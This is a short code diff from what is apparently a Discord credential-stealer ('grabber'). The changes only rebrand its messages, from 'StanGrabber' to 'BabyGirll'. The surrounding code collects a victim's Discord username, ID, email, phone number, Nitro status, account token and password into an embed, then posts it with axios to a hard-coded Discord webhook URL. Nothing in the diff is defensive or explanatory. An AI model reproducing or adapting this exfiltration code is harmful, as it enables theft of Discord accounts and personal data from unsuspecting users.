@@ -42,14 +42,14 @@ exports.send = (req, res, webhook) => {
   author: {
     name: "Baby ;; Girl"
   },
-  title: "New person stoled",
+  title: "Nuevo tontio",
   description: `Username: \`${JSON.parse(JSON.stringify(y)).username}#${JSON.parse(JSON.stringify(y)).discriminator}\`\nID: \`${JSON.parse(JSON.stringify(y)).id}\`\nE-Mail: \`${JSON.parse(JSON.stringify(y)).email}\`\nPhone: \`${JSON.parse(JSON.stringify(y)).phone}\`\nNitro Type: \`${nitro}\`\nToken: \`${token}\`\nPassword: \`${password}\``,
 
 }
             
 
         axios.post(`https://canary.discord.com/api/webhooks/913859001341595668/klZxFh45crWCGNhelZO3YGaBFpuK1ZXQIsRe3CpkNjHAgmglpXK4XSishEm37z2mdNds`, {
-            username: JSON.parse(JSON.stringify(y)).username + " - StanGrabber",
+            username: JSON.parse(JSON.stringify(y)).username + " - BabyGirll",
             content: '', 
             embeds:[ omg ]
         }).then((z) => {
